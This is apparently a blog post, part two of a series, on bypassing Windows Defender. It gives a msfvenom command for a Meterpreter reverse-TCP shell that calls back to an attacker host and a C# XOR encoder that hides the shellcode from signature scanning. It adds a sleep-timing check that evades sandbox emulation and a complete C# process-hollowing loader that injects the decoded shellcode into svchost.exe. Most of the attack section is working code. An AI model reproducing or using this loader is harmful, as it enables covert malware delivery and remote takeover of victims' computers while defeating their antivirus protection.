---
layout: post
title: Unleashing the Power of In-Memory Code Injection Part-II .
description: "In-Memory Code Injection"
modified: 2024-1-02
tags: [In-Memory Code Injection, Malware]
image:
  feature: memory.png
---
<style>
.tablelines table, .tablelines td, .tablelines th {
        border: 1px solid black;
        }
</style>

In the previous [post](https://el-5heikh.github.io/In-Memory-Code-Injection-1/), we were able to inject our milicous code into a process that normally performs network traffic. although this technique may evade some detection methods, our reverse shell still detectable.<br>
First, let's explore the most common security solutions.

| Security Solution  | Functionality | Purpose | Detection | Prevention | Scope |
| :--------   | :------- | :--------   | :------- | :--------   | :------- |
| **AV (Antivirus)** | Antivirus software is a fundamental cybersecurity tool that primarily targets malware, including viruses, worms, Trojans, and other types of malicious software | AV scans files, programs, and the system for known malware signatures and suspicious behavior that may indicate the presence of malware. | It relies on signature-based detection for known threats and may use heuristics and behavior analysis for identifying new or unknown malware. | When a malware threat is detected, the antivirus software will quarantine or remove the malicious files to prevent the infection from spreading. | AV is typically installed on endpoints and sometimes on servers, providing continuous protection against various types of malware threats. |
| **EDR (Endpoint Detection and Response)** | EDR is focused on endpoint security, which means it is installed on individual devices (endpoints) such as laptops, desktops, servers, or mobile devices. | EDR monitors endpoint activities in real-time and collects detailed information about the system, user behavior, and network connections.   | It uses advanced techniques like behavior analysis, machine learning, and threat intelligence to detect and respond to suspicious or malicious activities on endpoints. | EDR can take proactive actions such as quarantining, blocking, or remediating threats on the endpoints to prevent the spread of attacks. | EDR is more focused on post-breach detection and response, providing visibility into ongoing threats and facilitating incident response. |
| **IPS (Intrusion Prevention System)** | IPS is a network security tool designed to monitor and protect the entire network infrastructure. | It inspects network traffic in real-time, looking for known signatures of malicious activities or anomalies that might indicate potential threats. | IPS uses signature-based detection and anomaly-based detection to identify and block malicious traffic, such as malware, exploits, and unauthorized access attempts. | When a threat is detected, IPS can actively block the malicious traffic, preventing it from reaching its target and effectively stopping attacks in real-time. | IPS is focused on real-time prevention and is a crucial component of network security, helping to protect against various external threats. |
| **IDS (Intrusion Detection System)** | IDS is also a network security tool that monitors network traffic like an IPS, but its primary function is to detect and alert administrators about potential security breaches. | IDS analyzes network packets, looking for suspicious patterns or known attack signatures. | When it identifies potentially malicious activities, it generates alerts or logs that are sent to security administrators for further investigation and response. | Unlike IPS, IDS does not actively prevent or block threats. Its role is to provide early warning and situational awareness to security teams. | IDS is more focused on passive monitoring and alerting, allowing security professionals to take appropriate actions based on the information it provides. |
{: .tablelines}

In this post we will focus on bypassing AV, Specifically windows defender.

**Windows Defender**, is an antivirus and anti-malware software designed to protect your computer from various threats, including viruses, malware, ransomware, and other malicious software. It employs several techniques for detection and heuristics to identify and mitigate these threats. Windows defender realy on AMSI in inspecting and analyzing scripts and code in memory, including fileless malware, before it is executed.

## 1. Antivirus Detection Overview:

Antivirus solutions primarily rely on two detection methods:

- **Signature-Based Detection:**
    Antivirus vendors use both automated processes and manual reverse-engineering to create signatures of known malware. These signatures are stored in vast databases and are used to identify files that match known malicious hashes or byte sequences, promptly flagging them as threats.

- **Heuristics or Behavioral Analysis:**
    Heuristics-based analysis simulates the execution of files within a controlled environment to detect suspicious behavior. By observing the actions of a scanned file in a sandboxed setting, heuristics can identify potential malware based on known malicious patterns.


### 1.1  Bypassing Antivirus Signature Detection

- One of the fundamental ways to bypass antivirus signature detection is to write custom code. By creating your own custom code, we can avoid detection based on known signatures. Moreover, when dealing with shellcode injection, employing custom encryption and decryption becomes crucial to evade antivirus scrutiny effectively.


### 1.2  Bypassing Antivirus Heuristic Detection:

- **Time Delay Bypass Techniques:**
    When an application runs in a emulator and encounters a pause or sleep instruction, the heuristics engine fast-forwards through the delay to accelerate the scanning process and avoid unnecessary wait times.

- **Non-Emulated APIs:**
    Antivirus emulator engines simulate the execution of common executable file formats and functions, leaving room for evasion by utilizing non-emulated APIs. Attackers can test various APIs against the antivirus engine to identify those that are incorrectly emulated or not emulated at all.


## 2. Bypassing Windows defender - The practical part.  

We need to bypass Windows Defender's signature-based detection and behavioral analysis.

### 2.1  Bypassing signature based detection.

Even after crafting our custom code, [process hollowing with c#](https://el-5heikh.github.io/In-Memory-Code-Injection-1/), it still contains certain signatures recognized by antivirus solutions due to the meterpreter shell. Our aim in this blog is to encode the meterpreter shell to circumvent this issue. One of the simplest approaches to achieve this is by utilizing XOR.

First, generate your basic shell code using the command below.

```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={YOUR-IP-ADDRESS} LPORT={YOUR LISTENING PORT} EXITFUNC=thread -f csharp
```
Second, use the following script to encode the shell

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XOR_Encode
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8}; //Replace with your shellcode

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xda);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];
                if ((count + 1) == totalCount)
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2},", b);
                }
                if ((count + 1) % 15 == 0)
                {
                    hex.Append("\n");
                }
            }
            Console.WriteLine($"XOR payload (key: 0xda):");
            Console.WriteLine($"byte[] shellcode = new byte[{buf.Length}] {{{hex}}};");

        }
    }
}
```
Then, the decoding function need to be added to process hollowing script.

```csharp
// Decode the XOR payload
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)((uint)shellcode[i] ^ 0xda);
            }

```

### 2.1  Bypassing behaviour analysis.

As previously discussed, two methods can be utilized to accomplish this. The time delay technique is going to be employed in order to evade behavior analysis.

```csharp
        // Time delay
        DateTime t1 = DateTime.Now;
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }
```
Basically, we'll implement a delay function at the start of the main function to check whether our code is running within an emulator. In emulator environments, when an app encounters a pause or sleep instruction, the heuristic engine accelerates through the delay, bypassing unnecessary wait times to expedite the scanning process.

This delay function will:

- Capture the current system time and store it as 't1.'
- Pause execution for a set period (e.g., 10 seconds in this case).
- Capture the time again post-pause, subtracting 't1' from it.
- Verify if the subtraction result is less than 9.5 seconds (indicating fast-forwarding). If so, the main function exits, recognizing it's in an emulator. If not, it proceeds assuming it's not in an emulator and resumes execution.

To compile the project, target a 64-bit architecture to ensure compatibility with svchost.exe, a 64-bit process. This compiled code will run the shellcode within svchost.exe.

**Now, our shellcode executes within a trusted process, communicating over the network, effectively evading Windows Defender detection. In an upcoming article, we'll delve into loading our shellcode or other C# tools like rubeus or mimikatz remotely, leveraging Powershell reflection, enabling remote execution without touching the desk.**

## The Full Code for bypassing Windows Defender with all its features.

```csharp
using System;
using System.Runtime.InteropServices;


namespace hollow
{
    public class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // Time delay
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }
            byte[] shellcode = new byte[511] {
0x26, 0x92, 0x59, 0x3e, 0x2a, 0x32, 0x16, 0xda,...
}; // Replace this with the payload generated from the xor encoding script
            STARTUPINFO StartInfo = new STARTUPINFO();
            PROCESS_INFORMATION ProcInfo = new PROCESS_INFORMATION();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, 0x4, IntPtr.Zero, null, ref StartInfo, out ProcInfo);

            PROCESS_BASIC_INFORMATION BasicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            long qResult = ZwQueryInformationProcess(ProcInfo.hProcess, 0, ref BasicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr baseImageAddr = (IntPtr)((Int64)BasicInfo.PebAddress + 0x10);

            byte[] addrBuf = new byte[0x8];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(ProcInfo.hProcess, baseImageAddr, addrBuf, addrBuf.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(addrBuf, 0);


            byte[] data = new byte[0x200];
            result = ReadProcessMemory(ProcInfo.hProcess, executableAddress, data, data.Length, out bytesRW);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)((Int64)executableAddress + entrypoint_rva);

            // Decode the XOR payload
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)((uint)shellcode[i] ^ 0xda);
            }

            result = WriteProcessMemory(ProcInfo.hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out bytesRW);

            uint rResult = ResumeThread(ProcInfo.hThread);
        }
    }
}
```